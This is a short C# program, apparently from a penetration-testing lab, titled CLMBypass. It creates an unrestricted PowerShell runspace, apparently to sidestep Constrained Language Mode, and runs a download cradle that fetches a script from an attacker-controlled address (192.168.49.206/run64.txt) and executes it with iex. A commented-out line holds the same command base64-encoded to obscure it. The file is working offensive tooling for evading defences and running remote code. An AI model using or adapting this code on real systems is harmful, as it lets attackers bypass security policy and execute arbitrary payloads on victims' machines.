using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace CLMBypass
{
    class Program
    {
        static void Main(string[] args)
        {
            //Create runspace for our PS session and open it
            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();

            //Create a new PS object and assign the runspace to it
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;

            //Set PS cmd to string, add it to PS session, execute or invoke it and close the runspace
            //Basic testing to see if it works
            //String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
            //Basic powershell cradle
            String cmd = "iex(iwr http://192.168.49.206/run64.txt -UseBasicParsing)";
            //Base64 string'd powershell cmd
            //String cmd = "iex([System.Text.Encoding]::Unicode.getString([System.Convert]::FromBase64String('aQBlAHgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4ANAA5AC4AMgAwADYALwByAHUAbgA2ADQALgB0AHgAdAAgAC0AVQBzAGUAYgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAKQA=')))";
            ps.AddScript(cmd);
            ps.Invoke();
            rs.Close();
        }
    }
}